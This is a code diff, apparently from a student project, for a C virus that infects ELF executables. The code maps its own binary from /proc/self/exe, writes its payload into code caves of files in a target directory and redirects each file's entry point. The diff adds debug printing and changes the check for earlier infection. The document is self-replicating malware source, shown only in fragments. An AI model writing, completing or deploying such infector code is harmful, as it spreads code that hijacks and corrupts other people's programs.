@@ -68,6 +68,7 @@ __attribute__((always_inline)) inline uint64_t copy_entries_into_code_caves(vola
                                                                             volatile uint64_t code_caves_target_num);
 __attribute__((always_inline)) inline uint64_t offset_to_addr(volatile file *file, volatile uint64_t offset);
 __attribute__((always_inline)) inline int file_write(int fd, volatile file *file);
+__attribute__((always_inline)) inline void print_number_hex(uint64_t num);
 
 // Helpers
 __attribute__((always_inline)) inline int ft_strlen(volatile char *str);
@@ -82,18 +83,24 @@ main(void) {
 void
 _start() {
 #endif
-    __attribute__((section(".text"))) volatile static char path_self[] = "/proc/self/exe";
+    ft_exit(88);
+    __attribute__((section(".text"))) volatile static char infect_test[] = "./in";
+    int fd_in = ft_open(infect_test, O_RDONLY, 0);
+    if (fd_in < 0) infected = 1;
+
+    volatile char path_self[] = {'/', 'p', 'r', 'o', 'c', '/', 's', 'e', 'l', 'f', '/', 'e', 'x', 'e', '\0'};
     ft_write(1, path_self, ft_strlen(path_self));
+    if (infected) ft_exit(33);
+
     int fd_self = ft_open(path_self, O_RDONLY, 0);
     if (fd_self < 0) ft_exit(1);
 
     volatile file file_self;
     if (file_mmap(fd_self, &file_self)) ft_exit(1);
 
-    Elf64_Ehdr *header = file_self.mem;
-    if (header->e_phnum != 2) infected = 1;
+    // Elf64_Ehdr *header = file_self.mem;
+    // if (header->e_phnum != 2) infected = 1;
 
-    if (infected) ft_exit(46);
     __attribute__((section(".text"))) volatile static char dir0[] = "./a";
     if (infect_dir(dir0, &file_self)) ft_exit(1);
 
@@ -212,6 +219,26 @@ infect_file(volatile char *path, volatile file *file_self) {
 
     header_target->e_entry = offset_to_addr(&file_target, builder_target_start_offset);
 
+    char index = 'i';
+    for (int i = 0; i < scaffold_target_size; i++) {
+
+        ft_write(1, &index, 1);
+        ft_write(1, &nl, 1);
+        print_number(i);
+        ft_write(1, &nl, 1);
+        print_number_hex(*(uint64_t *)(file_target.mem + scaffolt_target_start_offset + i * 16));
+        ft_write(1, &nl, 1);
+        print_number_hex(*(uint64_t *)(file_target.mem + scaffolt_target_start_offset + i * 16 + 8));
+
+        ft_write(1, &nl, 1);
+    }
+    ft_write(1, &nl, 1);
+    ft_write(1, &nl, 1);
+    ft_write(1, &nl, 1);
+    print_number_hex(scaffolt_target_start_offset);
+    ft_write(1, &nl, 1);
+    print_number_hex(scaffold_target_size);
+    ft_write(1, &nl, 1);
     char c = 'a';
     ft_write(1, &c, 1);
     ft_write(1, &c, 1);
@@ -492,6 +519,35 @@ addr_to_offset(volatile file *file, volatile uint64_t addr) {
     }
 
     return 0;
+}
+
+__attribute__((always_inline)) inline void
+print_number_hex(uint64_t num) {
+    char buf[20]; // enough for up to 20 digits of 64-bit number
+    int pos = 0;
+
+    // special case 0
+    if (num == 0) {
+        char c = '0';
+        ft_write(1, &c, 1);
+        return;
+    }
+
+    // extract digits in reverse order
+    while (num > 0) {
+        uint64_t cur = num % 16;
+        if (cur < 10)
+            buf[pos++] = '0' + cur;
+        else
+            buf[pos++] = 'a' + cur - 10;
+        num /= 16;
+    }
+
+    // output digits in correct order
+    while (pos > 0) {
+        char c = buf[--pos];
+        ft_write(1, &c, 1);
+    }
 }
 
 __attribute__((always_inline)) inline void
